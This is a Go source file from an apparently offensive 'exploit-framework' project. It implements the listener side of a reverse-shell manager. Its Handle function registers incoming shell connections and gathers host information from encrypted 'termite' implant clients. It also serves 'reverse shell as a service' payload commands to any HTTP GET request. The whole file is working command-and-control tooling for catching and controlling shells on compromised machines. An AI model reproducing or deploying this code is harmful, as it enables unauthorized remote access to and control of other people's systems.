package context

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"time"


	"github.com/krishpranav/exploit-framework/lib/util/crypto"
	"github.com/krishpranav/exploit-framework/lib/util/hash"
	"github.com/krishpranav/exploit-framework/lib/util/log"
	"github.com/krishpranav/exploit-framework/lib/util/message"
	"github.com/krishpranav/exploit-framework/lib/util/network"
	"github.com/krishpranav/exploit-framework/lib/util/raas"
	"github.com/krishpranav/exploit-framework/lib/util/str"

	humanize "github.com/dustin/go-humanize"
	"github.com/jedib0t/go-pretty/table"
)

type WebSocketMessage struct {
	Type WebSocketMessageType
	Data interface{}
}

type TCPServer struct {
	Host           string                      `json:"host"`
	GroupDispatch  bool                        `json:"group_dispatch"`
	Port           uint16                      `json:"port"`
	Clients        map[string](*TCPClient)     `json:"clients"`
	TermiteClients map[string](*TermiteClient) `json:"termite_clients"`
	TimeStamp      time.Time                   `json:"timestamp"`
	Interfaces     []string                    `json:"interfaces"`
	Hash           string                      `json:"hash"`
	Encrypted      bool                        `json:"encrypted"`
	hashFormat     string
	stopped        chan struct{}
}

func CreateTCPServer(host string, port uint16, hashFormat string, encrypted bool) *TCPServer {
	service := fmt.Sprintf("%s:%d", host, port)

	if Ctx.Servers[hash.MD5(service)] != nil {
		log.Error("The server (%s) already exists", service)
		return nil
	}

	// Default hashFormat
	if hashFormat == "" {
		hashFormat = "%i %u %m %o %t"
	}

	tcpServer := &TCPServer{
		Host:           host,
		Port:           port,
		GroupDispatch:  true,
		Clients:        make(map[string](*TCPClient)),
		TermiteClients: make(map[string](*TermiteClient)),
		Interfaces:     []string{},
		TimeStamp:      time.Now(),
		hashFormat:     hashFormat,
		Hash:           hash.MD5(fmt.Sprintf("%s:%d", host, port)),
		stopped:        make(chan struct{}, 1),
		Encrypted:      encrypted,
	}

	Ctx.Servers[hash.MD5(service)] = tcpServer

	// Gather listening interfaces
	tcpServer.Interfaces = network.GatherInterfacesList(tcpServer.Host)

	// Support for distributor for termite
	if encrypted {
		for _, ifaddr := range tcpServer.Interfaces {
			routeKey := str.RandomString(0x08)
			Ctx.Distributor.Route[fmt.Sprintf("%s:%d", ifaddr, port)] = routeKey
		}
	}

	// Try to check
	log.Info("Trying to create server on: %s", service)
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		log.Error("Resolve TCP address failed: %s", err)
		Ctx.DeleteServer(tcpServer)
		return nil
	}

	listener, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		log.Error("Listen failed: %s", err)
		Ctx.DeleteServer(tcpServer)
		return nil
	} else {
		listener.Close()
	}

	return tcpServer
}

func (s *TCPServer) Handle(conn net.Conn) {
	if s.Encrypted {
		client := CreateTermiteClient(conn, s)
		// Send gather info request
		log.Info("Gathering information from client...")
		if client.GatherClientInfo(s.hashFormat) {
			log.Info("A new encrypted income connection from %s", client.conn.RemoteAddr())
			s.AddTermiteClient(client)
		} else {
			log.Info("Failed to check encrypted income connection from %s", client.conn.RemoteAddr())
			client.Close()
		}
	} else {
		client := CreateTCPClient(conn, s)
		log.Info("A new income connection from %s", client.conn.RemoteAddr())
		// Reverse shell as a service
		buffer := make([]byte, 4)
		client.conn.SetReadDeadline(time.Now().Add(time.Second * 3))
		client.readLock.Lock()
		n, err := client.conn.Read(buffer)
		client.readLock.Unlock()
		client.conn.SetReadDeadline(time.Time{})
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Debug("Not requesting for service")
			} else {
				client.Close()
			}
		}
		if string(buffer[:n]) == "GET " {
			requestURI := client.ReadUntilClean(" ")
			// Read HTTP Version
			client.ReadUntilClean("\r\n")
			httpHost := fmt.Sprintf("%s:%d", s.Host, s.Port)
			for {
				var line = client.ReadUntilClean("\r\n")
				// End of headers
				if line == "" {
					log.Debug("All header read")
					break
				}
				delimiter := ":"
				index := strings.Index(line, delimiter)
				headerKey := line[:index]
				headerValue := strings.Trim(line[index+len(delimiter):], " ")
				if headerKey == "Host" {
					httpHost = headerValue
				}
			}
			command := fmt.Sprintf("%s\n", raas.URI2Command(requestURI, httpHost))
			client.Write([]byte("HTTP/1.0 200 OK\r\n"))
			client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
			client.Write([]byte("\r\n"))
			client.Write([]byte(command))
			client.Close()
			log.Info("A RaaS request from %s served", client.conn.RemoteAddr().String())
		} else {
			s.AddTCPClient(client)
		}
	}
}
